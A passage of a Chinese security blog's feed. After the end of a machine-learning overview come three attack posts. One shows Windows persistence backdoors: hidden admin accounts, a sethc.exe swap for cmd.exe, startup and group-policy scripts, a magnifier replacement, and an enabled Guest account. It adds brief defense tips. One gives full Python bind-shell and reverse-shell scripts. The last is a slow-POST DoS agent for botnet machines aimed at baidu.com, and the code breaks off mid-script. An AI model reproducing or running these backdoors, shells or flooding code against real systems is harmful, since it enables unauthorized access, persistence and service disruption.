href="#8-计算机程序和其它的过程编码" class="headerlink" title="(8)计算机程序和其它的过程编码"></a>(8)计算机程序和其它的过程编码</h4><p>获取这种形式的知识，目的在于取得一种能实现特定过程的能力，而不是为了推断该过程的内部结构。</p><h4 id="9-神经网络"><a href="#9-神经网络" class="headerlink" title="(9)神经网络"></a>(9)神经网络</h4><p>这主要用在联接学习中。学习所获取的知识，最后归纳为一个神经网络。</p><h4 id="10-多种表示形式的组合"><a href="#10-多种表示形式的组合" class="headerlink" title="(10)多种表示形式的组合"></a>(10)多种表示形式的组合</h4><p>有时一个学习系统中获取的知识需要综合应用上述几种知识表示形式。</p><h2 id="0x04-按照学习形势分类"><a href="#0x04-按照学习形势分类" class="headerlink" title="0x04 按照学习形势分类"></a>0x04 按照学习形势分类</h2><h4 id="1-监督学习-supervised-learning"><a href="#1-监督学习-supervised-learning" class="headerlink" title="(1)监督学习(supervised learning)"></a>(1)监督学习(supervised learning)</h4><p>监督学习，即在机械学习过程中提供对错指示。一般实在是数据组中包含最终结果（0，1）。通过算法让机器自我减少误差。这一类学习主要应用于分类和预测 (regression &amp; classify)。监督学习从给定的训练数据集中学习出一个函数，当新的数据到来时，可以根据这个函数预测结果。监督学习的训练集要求是包括输入和输出，也可以说是特征和目标。训练集中的目标是由人标注的。</p><p>常见的监督学习算法：</p><p>线性回归，逻辑回归，神经网络，SVM</p><h4 id="2-非监督学习-unsupervised-learning"><a href="#2-非监督学习-unsupervised-learning" class="headerlink" title="(2)非监督学习(unsupervised learning)"></a>(2)非监督学习(unsupervised learning)</h4><p>非监督学习又称归纳性学习（clustering）利用K方式(Kmeans)，建立中心（centriole），通过循环和递减运算(iteration&amp;descent)来减小误差，达到分类的目的。</p><p>常见的无监督学习算法：</p><p>聚类算法，降维算法</p><h2 id="0x05-机器学习的范围"><a href="#0x05-机器学习的范围" class="headerlink" title="0x05 机器学习的范围"></a>0x05 机器学习的范围</h2><h4 id="模式识别"><a href="#模式识别" class="headerlink" title="模式识别"></a>模式识别</h4><p>模式识别=机器学习。两者的主要区别在于前者是从工业界发展起来的概念，后者则主要源自计算机学科。在著名的《Pattern Recognition And Machine Learning》这本书中，Christopher M. Bishop在开头是这样说的“模式识别源自工业界，而机器学习来自于计算机学科。不过，它们中的活动可以被视为同一个领域的两个方面，同时在过去的10年间，它们都有了长足的发展”。</p><h4 id="数据挖掘"><a href="#数据挖掘" class="headerlink" title="数据挖掘"></a>数据挖掘</h4><p>数据挖掘=机器学习+数据库。这几年数据挖掘的概念实在是太耳熟能详。几乎等同于炒作。但凡说数据挖掘都会吹嘘数据挖掘如何如何，例如从数据中挖出金子，以及将废弃的数据转化为价值等等。但是，我尽管可能会挖出金子，但我也可能挖的是“石头”啊。这个说法的意思是，数据挖掘仅仅是一种思考方式，告诉我们应该尝试从数据中挖掘出知识，但不是每个数据都能挖掘出金子的，所以不要神话它。一个系统绝对不会因为上了一个数据挖掘模块就变得无所不能(这是IBM最喜欢吹嘘的)，恰恰相反，一个拥有数据挖掘思维的人员才是关键，而且他还必须对数据有深刻的认识，这样才可能从数据中导出模式指引业务的改善。大部分数据挖掘中的算法是机器学习的算法在数据库中的优化。</p><h4 id="统计学习"><a href="#统计学习" class="headerlink" title="统计学习"></a>统计学习</h4><p>统计学习近似等于机器学习。统计学习是个与机器学习高度重叠的学科。因为机器学习中的大多数方法来自统计学，甚至可以认为，统计学的发展促进机器学习的繁荣昌盛。例如著名的支持向量机算法，就是源自统计学科。但是在某种程度上两者是有分别的，这个分别在于：统计学习者重点关注的是统计模型的发展与优化，偏数学，而机器学习者更关注的是能够解决问题，偏实践，因此机器学习研究者会重点研究学习算法在计算机上执行的效率与准确性的提升。</p><h4 id="计算机视觉"><a href="#计算机视觉" class="headerlink" title="计算机视觉"></a>计算机视觉</h4><p>计算机视觉=图像处理+机器学习。图像处理技术用于将图像处理为适合进入机器学习模型中的输入，机器学习则负责从图像中识别出相关的模式。计算机视觉相关的应用非常的多，例如百度识图、手写字符识别、车牌识别等等应用。这个领域是应用前景非常火热的，同时也是研究的热门方向。随着机器学习的新领域深度学习的发展，大大促进了计算机图像识别的效果，因此未来计算机视觉界的发展前景不可估量。</p><h4 id="语音识别"><a href="#语音识别" class="headerlink" title="语音识别"></a>语音识别</h4><p>语音识别=语音处理+机器学习。语音识别就是音频处理技术与机器学习的结合。语音识别技术一般不会单独使用，一般会结合自然语言处理的相关技术。目前的相关应用有苹果的语音助手siri等。</p><h4 id="自然语言处理"><a href="#自然语言处理" class="headerlink" title="自然语言处理"></a>自然语言处理</h4><p>自然语言处理=文本处理+机器学习。自然语言处理技术主要是让机器理解人类的语言的一门领域。在自然语言处理技术中，大量使用了编译原理相关的技术，例如词法分析，语法分析等等，除此之外，在理解这个层面，则使用了语义理解，机器学习等技术。作为唯一由人类自身创造的符号，自然语言处理一直是机器学习界不断研究的方向。按照百度机器学习专家余凯的说法“听与看，说白了就是阿猫和阿狗都会的，而只有语言才是人类独有的”。如何利用机器学习技术进行自然语言的的深度理解，一直是工业和学术界关注的焦点。</p>]]></content>
    
    
    <categories>
      
      <category>机器学习</category>
      
    </categories>
    
    
    <tags>
      
      <tag>机器学习</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>windows常用后门技术及防范</title>
    <link href="/2018/06/18/windows%E5%B8%B8%E7%94%A8%E5%90%8E%E9%97%A8%E6%8A%80%E6%9C%AF%E5%8F%8A%E9%98%B2%E8%8C%83/"/>
    <url>/2018/06/18/windows%E5%B8%B8%E7%94%A8%E5%90%8E%E9%97%A8%E6%8A%80%E6%9C%AF%E5%8F%8A%E9%98%B2%E8%8C%83/</url>
    
    <content type="html"><![CDATA[<h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>维持权限同样是渗透测试非常重要的一环，他可以让我们方便的再次进入系统并且降低被发现的概率，而维持权限的方式也就是留后门，了解一些常见的后门技术，不仅可以在进攻时提供维持权限的思路，同时，在防守时也可以更准确的发现隐患。</p><h2 id="0x01-隐藏账户"><a href="#0x01-隐藏账户" class="headerlink" title="0x01 隐藏账户"></a>0x01 隐藏账户</h2><p>隐藏账户应该是最常见的后门方式，其设置方式如下：</p><p>首先我们在命令行输入，如下命令创建一个隐藏账号</p><figure class="highlight crmsh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs crmsh">net <span class="hljs-keyword">user</span> <span class="hljs-title">leticia</span>$ <span class="hljs-number">123456</span> /add<br></code></pre></td></tr></table></figure><p>这个时候，通过net user并不能看到这个账户。</p><p><img src="https://github.com/echohun/blog_image/blob/master/windows_backdoor/backdoor01.png?raw=true"></p><p>然后我们将它添加到管理员权限。</p><figure class="highlight avrasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs avrasm">net localgroup administrators leticia$ /<span class="hljs-keyword">add</span><br></code></pre></td></tr></table></figure><p><img src="https://github.com/echohun/blog_image/blob/master/windows_backdoor/backdoor02.png?raw=true"></p><p>但是这个“隐藏账户”在用户账户中可以看到，并不能骗过细心的管理员。</p><p><img src="https://github.com/echohun/blog_image/blob/master/windows_backdoor/backdoor03.png?raw=true"></p><p>这个时候我们可以通过操作注册表，使这个账户在用户账户中也不显示。首先我们输入regedit打开注册表编辑器，找到HKEY_LOCAL_MACHINE\SAM\SAM，我们发现这个时候它是空白的，没有权限进行操作，所以我们要右键权限，将读写权限赋予administrator。</p><p><img src="https://github.com/echohun/blog_image/blob/master/windows_backdoor/backdoor04.png?raw=true"></p><p>然后我们重启注册表编辑器，发现这个时候已经可以访问了，我们在里面找到刚才创建的leticia$账号和administrator账号对应的键值类型。</p><p><img src="https://github.com/echohun/blog_image/blob/master/windows_backdoor/backdoor05.png?raw=true"></p><p><img src="https://github.com/echohun/blog_image/blob/master/windows_backdoor/backdoor06.png?raw=true"></p><p>然后在上一级文件中找键值类型对应的目录，将administrator对应目录中的F值复制到leticia$对应目录中的F值。</p><p><img src="https://github.com/echohun/blog_image/blob/master/windows_backdoor/backdoor07.png?raw=true"></p><p>复制完成后，把leticia$和其对应的0000003EA目录先导出并保存。</p><p><img src="https://github.com/echohun/blog_image/blob/master/windows_backdoor/backdoor08.png?raw=true"></p><p>然后在命令行中删除刚才的账号</p><figure class="highlight crmsh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs crmsh">net <span class="hljs-keyword">user</span> <span class="hljs-title">leticia</span>$ /del<br></code></pre></td></tr></table></figure><p><img src="https://github.com/echohun/blog_image/blob/master/windows_backdoor/backdoor09.png?raw=true"></p><p>最后将刚才导出的注册表文件重新导入，隐藏账户就添加成功了。</p><p><img src="https://github.com/echohun/blog_image/blob/master/windows_backdoor/backdoor10.png?raw=true"></p><p>此时在用户账户中看不到这个隐藏账户。</p><p><img src="https://github.com/echohun/blog_image/blob/master/windows_backdoor/backdoor11.png?raw=true"></p><p>这个时候其实已经完成了，但是我们还可以再走一步操作，那就是把注册表刚才赋予administrator的权限禁止掉，这样这个账户就很难被发现了。</p><p>防范：</p><ul><li>经常检查用户账户、注册表关键位置。</li><li>将计算机对用户登陆事件的审核策略打开。</li></ul><h2 id="0x02-shift后门"><a href="#0x02-shift后门" class="headerlink" title="0x02 shift后门"></a>0x02 shift后门</h2><p>shift后门是很常见的留后门手法，其原理是用cmd.exe替换原先粘滞键，粘滞键的程序sethc.exe可以通过五次shift键调用，这样我们就可以直接通过按五次shift来调用一个system权限的命令行来执行命令、创建用户等。</p><p>shift后门有着非常丰富的骚操作，我们先来通过一个最基础的shift后门来学习原理。</p><p>制作方法如下：</p><p>我们先进入C:\WINDOWS\system32目录,在这里右键打开命令行，依次输入</p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs vim"><span class="hljs-keyword">move</span> sethc.<span class="hljs-keyword">exe</span> sethc.<span class="hljs-keyword">exe</span>.bak<br><span class="hljs-keyword">copy</span> cmd.<span class="hljs-keyword">exe</span> sethc.<span class="hljs-keyword">exe</span><br></code></pre></td></tr></table></figure><p><img src="https://github.com/echohun/blog_image/blob/master/windows_backdoor/backdoor12.png?raw=true"></p><p>这两句命令分别是将粘滞键程序备份，然后用cmd.exe覆盖原本的粘滞键程序。</p><p>然后我们每次要使用时按5次shift键弹出cmd窗口，可直接以system权限执行系统命令，创建管理员用户，登录服务器等。最后每次删除掉新建的账户，减少被发现的概率。</p><p>如图，我们可以在登陆界面就直接调用cmd：</p><p><img src="https://github.com/echohun/blog_image/blob/master/windows_backdoor/backdoor13.png?raw=true"></p><p>防范：</p><ul><li>自行呼出粘滞键检查问题。</li><li>禁用粘滞键。</li></ul><h2 id="0x03-启动项后门"><a href="#0x03-启动项后门" class="headerlink" title="0x03 启动项后门"></a>0x03 启动项后门</h2><p>我们可以让目标机器在每次启动的时候创建一个账户，在这个思路下有很多可以采取的措施，第一种是启动项：</p><p>在C:\Users\Administrator\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup目录中，放入我们启动时要运行的批处理代码或其他可运行文件，一般是创建一个管理员账户：</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">@echo <span class="hljs-keyword">off</span><br>net <span class="hljs-keyword">user</span> leticia$ <span class="hljs-number">123456</span> /<span class="hljs-keyword">add</span> <br>net localgroup administrators leticia$ /<span class="hljs-keyword">add</span><br></code></pre></td></tr></table></figure><p>防范：</p><ul><li>定期检查启动文件夹内容。</li></ul><h2 id="0x04-组策略"><a href="#0x04-组策略" class="headerlink" title="0x04 组策略"></a>0x04 组策略</h2><p>第二种方法是组策略，可以在gpedit.msc中的windows设置-脚本(启动/关机)中添加新的启动脚本，在开机时就会自动运行。</p><p><img src="https://github.com/echohun/blog_image/blob/master/windows_backdoor/backdoor14.png?raw=true"></p><p>相比于第一种放在启动目录中，放在组策略中更加隐蔽，一般不容易引起管理员察觉，从而降低被删除的概率。</p><p>防范：</p><ul><li>定期检查组策略。</li></ul><h2 id="0x05-放大镜后门"><a href="#0x05-放大镜后门" class="headerlink" title="0x05 放大镜后门"></a>0x05 放大镜后门</h2><p>放大镜后门其实和shift后门很相似，我们可以先备份放大镜程序magnify.exe为magnify2.exe，然后写一个创建新用户并打开真正的放大镜的程序(防止被管理员发现放大镜程序失效),再将其转换为exe文件，并重命名成magnify.exe，然后通过调用放大镜程序来创建新用户供我们登陆。</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs awk">@echo off<br>net user leticia$ <span class="hljs-number">123456</span> /add <br>net localgroup administrators leticia$ /add<br>c:\windows\system32\magnify2.exe<br><span class="hljs-keyword">exit</span><br></code></pre></td></tr></table></figure><p>防范：</p><ul><li>调用放大镜检查。</li><li>定期检查用户组。</li></ul><h2 id="0x06-telnet后门"><a href="#0x06-telnet后门" class="headerlink" title="0x06 telnet后门"></a>0x06 telnet后门</h2><p>如果我们直接打开远程桌面的3389很容易就会被发现，但是我们打开telnet服务并改变默认端口(23)，就可以做一定程度的隐藏，我们在服务中打开telnet服务，然后将windows服务中的telnet客户端打开，然后在我们本机打开telnet服务端，访问目标主机ip和端口并登陆我们的用户名密码即可。</p><p>防范：</p><ul><li>定期检查服务器的进程端口有没有存在后门程序。</li></ul><h2 id="0x07-启用Guest用户"><a href="#0x07-启用Guest用户" class="headerlink" title="0x07 启用Guest用户"></a>0x07 启用Guest用户</h2><p>Guest用户本身就存在于计算机中，但是一般默认禁止，且不可登录，我们可以通过命令激活Guest用户并赋予管理员权限，并允许远程桌面登录。</p><figure class="highlight crmsh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs crmsh">net <span class="hljs-keyword">user</span> <span class="hljs-title">Guest</span> /active:yes<br>net <span class="hljs-keyword">user</span> <span class="hljs-title">Guest</span> www.baidu.com<br>net localgroup Administrators Guest /ADD<br></code></pre></td></tr></table></figure><p>gpedit.msc-&gt;计算机配置-&gt;windows设置-&gt;安全设置-&gt;本地策略-&gt;用户权限分配-&gt;允许通过远程桌面服务登录 添加Guest</p><p>防范：</p><ul><li>定期检查gpedit.msc-&gt;计算机配置-&gt;windows设置-&gt;安全设置-&gt;本地策略-&gt;用户权限分配中关于Guest用户的权限配置</li></ul><h2 id="0x08-总结"><a href="#0x08-总结" class="headerlink" title="0x08 总结"></a>0x08 总结</h2><p>留后门的方法有很多很多，但是大部分人会首先从这些方面入手，所以在检查系统有没有被留后门，也可以换位思考，在自己可能留后门的点上多注意一下，或许就会有收获。</p>]]></content>
    
    
    <categories>
      
      <category>渗透测试</category>
      
    </categories>
    
    
    <tags>
      
      <tag>渗透测试</tag>
      
      <tag>shell</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>基于python的直连shell和反射shell</title>
    <link href="/2018/06/17/%E5%9F%BA%E4%BA%8Epython%E7%9A%84%E7%9B%B4%E8%BF%9Eshell%E5%92%8C%E5%8F%8D%E5%B0%84shell/"/>
    <url>/2018/06/17/%E5%9F%BA%E4%BA%8Epython%E7%9A%84%E7%9B%B4%E8%BF%9Eshell%E5%92%8C%E5%8F%8D%E5%B0%84shell/</url>
    
    <content type="html"><![CDATA[<h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>每次对服务器进行了渗透和提权之后，下一步就该维持权限（留后门），方便我们下次执行命令，留一个后门比起每次重新从webshell进入，一是降低被发现的概率，二是免去繁琐的操作，三是如果web漏洞被修补webshell被查杀，有时候我们放进去隐藏较好的后门并没有被查杀，我们仍然可以控制这台机器。</p><p>这里介绍两个可以通过netcat连接的python版shell。</p><h2 id="0x01-需要的库"><a href="#0x01-需要的库" class="headerlink" title="0x01 需要的库"></a>0x01 需要的库</h2><ul><li>os： os模块提供了非常丰富的方法用来处理文件和目录。</li><li>subprocess： subprocess是Python 2.4中新增的一个模块，它允许你生成新的进程，连接到它们的 input/output/error 管道，并获取它们的返回（状态）码。我们这里主要使用subprocess.call()函数，执行指定的命令，并返回命令执行状态。</li><li>socket:  Python 提供了两个基本的 socket 模块。第一个是 Socket，它提供了标准的 BSD Sockets API。第二个是 SocketServer，它提供了服务器中心类，可以简化网络服务器的开发。</li><li>optparse： optparse模块用来处理命令行参数，使我们在统一管理时更方便。</li></ul><h2 id="0x02-直连型shell"><a href="#0x02-直连型shell" class="headerlink" title="0x02 直连型shell"></a>0x02 直连型shell</h2><p>先贴代码：</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-comment">#filename:zshell.py</span><br><span class="hljs-keyword">from</span> socket import *<br>import subprocess<br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:<br>   <span class="hljs-built_in"> server </span>= socket(AF_INET, SOCK_STREAM)<br>    server.bind((<span class="hljs-string">&#x27;0.0.0.0&#x27;</span>, 2333))<br>    server.listen(5)<br>    <span class="hljs-builtin-name">print</span> (<span class="hljs-string">&#x27;waiting for connect&#x27;</span>)<br>    <span class="hljs-keyword">while</span> 1:<br>        talk, addr = server.accept()<br>        <span class="hljs-builtin-name">print</span>(<span class="hljs-string">&#x27;connect from&#x27;</span>, addr)<br>        proc = subprocess.Popen([<span class="hljs-string">&quot;python -c &#x27;import pty; pty.spawn(\&quot;/bin/bash\&quot;)&#x27;&quot;</span>],<br>                                <span class="hljs-attribute">stdin</span>=talk,<br>                                <span class="hljs-attribute">stdout</span>=talk,<br>                                <span class="hljs-attribute">stderr</span>=talk,<br>                                <span class="hljs-attribute">shell</span>=<span class="hljs-literal">True</span>)<br></code></pre></td></tr></table></figure><p>这段代码的作用是，创建一个在2333端口监听任意ip的socket，如果监听到连接，就打开一个/bin/bash进程提供给目标ip执行命令。</p><p>我们要使用他时，只需在目标服务器执行</p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs vim"><span class="hljs-keyword">python</span> zshell.<span class="hljs-keyword">py</span><br></code></pre></td></tr></table></figure><p>然后在我们自己的机器使用netcat输入：</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">nc</span> &lt;服务器ip&gt; <span class="hljs-number">2333</span><br></code></pre></td></tr></table></figure><p>就可以连接服务器执行命令，演示效果如下，主机是kali，靶机是ubuntu：</p><p><img src="https://raw.githubusercontent.com/echohun/blog_image/master/python_shell/shell01.png"></p><p><img src="https://raw.githubusercontent.com/echohun/blog_image/master/python_shell/shell02.png"></p><h2 id="0x03-反射型shell"><a href="#0x03-反射型shell" class="headerlink" title="0x03 反射型shell"></a>0x03 反射型shell</h2><p>有时我们并不能直接访问目标服务器，这个时候可以通过反射shell来连接，也就是在我们本机使用netcat创建监听，然后让服务器上主动连接我们：<br>先贴要放在服务器端的代码：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#filename：fshell.py</span><br><span class="hljs-keyword">import</span> os<br><span class="hljs-keyword">import</span> socket<br><span class="hljs-keyword">import</span> subprocess<br><span class="hljs-keyword">import</span> optparse<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">connect_shell</span>(<span class="hljs-params">HOST,PORT</span>):</span><br>    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)<br>    s.connect((HOST, PORT))<br>    <span class="hljs-comment"># 重定向shell输出</span><br>    os.dup2(s.fileno(), <span class="hljs-number">0</span>)<br>    os.dup2(s.fileno(), <span class="hljs-number">1</span>)<br>    os.dup2(s.fileno(), <span class="hljs-number">2</span>)<br>    <span class="hljs-comment"># 执行子程序</span><br>    p = subprocess.call([<span class="hljs-string">&#x27;/bin/bash&#x27;</span>, <span class="hljs-string">&#x27;-i&#x27;</span>])<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">main</span>():</span><br>    parser = optparse.OptionParser()<br>    parser.add_option(<span class="hljs-string">&#x27;-H&#x27;</span>, dest=<span class="hljs-string">&#x27;HOST&#x27;</span>, <span class="hljs-built_in">type</span>=<span class="hljs-string">&#x27;string&#x27;</span>, <span class="hljs-built_in">help</span>=<span class="hljs-string">&quot;IP address or Website&quot;</span>)<br>    parser.add_option(<span class="hljs-string">&#x27;-p&#x27;</span>, dest=<span class="hljs-string">&#x27;PORT&#x27;</span>, <span class="hljs-built_in">type</span>=<span class="hljs-string">&#x27;int&#x27;</span>, <span class="hljs-built_in">help</span>=<span class="hljs-string">&quot;Port num&quot;</span>)<br>    (options, args) = parser.parse_args()<br>    <span class="hljs-keyword">if</span>(options.HOST==<span class="hljs-literal">None</span>)|(options.PORT==<span class="hljs-literal">None</span>):<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;---wrong input!---&#x27;</span>+<span class="hljs-string">&#x27;\n&#x27;</span>)<br>        exit(<span class="hljs-number">0</span>)<br>    <span class="hljs-keyword">else</span>:<br>        HOST = options.HOST<br>        PORT = options.PORT<br>    <span class="hljs-keyword">while</span>(<span class="hljs-number">1</span>):<br>        <span class="hljs-keyword">try</span>:<br>            connect_shell(HOST,PORT)<br>        <span class="hljs-keyword">except</span>:<br>            <span class="hljs-keyword">pass</span><br><br><span class="hljs-keyword">if</span> __name__ ==<span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    main()<br></code></pre></td></tr></table></figure><p>我们在服务端执行此代码，通过命令行参数传入我们本机的ip和监听端口，然后创建向传入的ip和端口的socket连接，再重定向shell之后通过subprocess.call调用/bin/bash来执行命令。</p><p>我们要使用它时，首先在本机输入：</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">nc</span> -lvp <span class="hljs-number">2333</span><br></code></pre></td></tr></table></figure><p>然后在服务端运行：</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus">python fshell<span class="hljs-selector-class">.py</span> -H &lt;我们自己机器的ip&gt; -<span class="hljs-selector-tag">p</span> <span class="hljs-number">2333</span><br></code></pre></td></tr></table></figure><p>就可以连接服务器执行命令，演示效果如下，主机是kali，靶机是ubuntu：</p><p><img src="https://raw.githubusercontent.com/echohun/blog_image/master/python_shell/shell03.png"></p><p><img src="https://raw.githubusercontent.com/echohun/blog_image/master/python_shell/shell04.png"></p><h2 id="0x04-总结"><a href="#0x04-总结" class="headerlink" title="0x04 总结"></a>0x04 总结</h2><p>除了python，其他语言也能实现这些功能，具体使用哪种语言根据目标系统存在的环境来选择，而linux系统都是集成了python环境的，所以这里用python做例子。</p><p>在留后门的过程中，重点并不是写出这个shell，而是如何隐藏它不被发现，下一次有时间会总结一下隐藏shell的各种方式。</p>]]></content>
    
    
    <categories>
      
      <category>python</category>
      
    </categories>
    
    
    <tags>
      
      <tag>python</tag>
      
      <tag>shell</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>基于python的ddos工具</title>
    <link href="/2018/06/04/%E5%9F%BA%E4%BA%8Epython%E7%9A%84ddos%E5%B7%A5%E5%85%B7/"/>
    <url>/2018/06/04/%E5%9F%BA%E4%BA%8Epython%E7%9A%84ddos%E5%B7%A5%E5%85%B7/</url>
    
    <content type="html"><![CDATA[<h2 id="0x00-ddos"><a href="#0x00-ddos" class="headerlink" title="0x00 ddos"></a>0x00 ddos</h2><p>分布式拒绝服务(DDoS:Distributed Denial of Service)攻击指借助于客户/服务器技术，将多个计算机联合起来作为攻击平台，对一个或多个目标发动DDoS攻击，从而成倍地提高拒绝服务攻击的威力。通常，攻击者使用一个偷窃帐号将DDoS主控程序安装在一个计算机上，在一个设定的时间主控程序将与大量代理程序通讯，代理程序已经被安装在网络上的许多计算机上。代理程序收到指令时就发动攻击。利用客户/服务器技术，主控程序能在几秒钟内激活成百上千次代理程序的运行。</p><p>这里我选择用python来写安装在肉鸡上的代理程序。</p><h2 id="0x01-需要安装的库"><a href="#0x01-需要安装的库" class="headerlink" title="0x01 需要安装的库"></a>0x01 需要安装的库</h2><ul><li>socket: Python 提供了两个基本的 socket 模块。第一个是 Socket，它提供了标准的 BSD Sockets API。第二个是 SocketServer，它提供了服务器中心类，可以简化网络服务器的开发。</li><li>time: 在产生错误时我们可以sleep一个时间来查看错误。</li><li>threading： 多线程的库，增加我们的请求量。</li><li>optparse： 此模块用来处理命令行参数，使我们在统一管理时更方便。</li></ul><h2 id="0x02-代码实现"><a href="#0x02-代码实现" class="headerlink" title="0x02 代码实现"></a>0x02 代码实现</h2><p>我们先不加命令行参数写一个，方便调试。</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-comment">#python3.6</span><br><br>import socket<br>import time<br>import threading<br><br><span class="hljs-attribute">MAX_CONN</span>=10<br><span class="hljs-attribute">PORT</span>=80<br><span class="hljs-attribute">HOST</span>=<span class="hljs-string">&quot;www.baidu.com&quot;</span><br><span class="hljs-attribute">PAGE</span>=<span class="hljs-string">&quot;/&quot;</span><br><br>data=(<span class="hljs-string">&quot;POST %s HTTP/1.1\r\n&quot;</span><br><span class="hljs-string">&quot;Host: %s\r\n&quot;</span><br><span class="hljs-string">&quot;Content-Length: 1000000000\r\n&quot;</span><br><span class="hljs-string">&quot;Cookie: ddos_test\r\n&quot;</span><br><span class="hljs-string">&quot;\r\n&quot;</span> % (PAGE,HOST))<br><br><span class="hljs-attribute">data2</span>=data.encode(&#x27;utf-8&#x27;)<br><br>socks=[]<br><br>def conn_thread():<br>    global socks<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(0,MAX_CONN):<br>        <span class="hljs-attribute">s</span>=socket.socket (socket.AF_INET,socket.SOCK_STREAM)<br>        try:<br>            s.connect((HOST,PORT))<br>            s.send(data2)<br>            <span class="hljs-builtin-name">print</span>(<span class="hljs-string">&quot;[+] Send data OK!,conn=%d\n&quot;</span> % i)<br>            socks.append(s)<br>        except:<br>            <span class="hljs-builtin-name">print</span> (<span class="hljs-string">&quot;[-] Could not connect to server or send error&quot;</span>)<br>            time.sleep(5)<br><br><br>def send_thread():<br>    global socks<br>    <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>        <span class="hljs-keyword">for</span> s <span class="hljs-keyword">in</span> socks:<br>            try:<br>                s.send(b<span class="hljs-string">&quot;f&quot;</span>)<br>                <span class="hljs-builtin-name">print</span> (<span class="hljs-string">&quot;[+] send OK! %s&quot;</span>%s)<br>            except:<br>                <span class="hljs-builtin-name">print</span> (<span class="hljs-string">&quot;[-] send error\n&quot;</span>)<br>                socks.<span class="hljs-builtin-name">remove</span>(s)<br>                s.close()<br>        time.sleep(1)<br><br><br><span class="hljs-attribute">conn_th</span>=threading.Thread(target=conn_thread,args=())<br><span 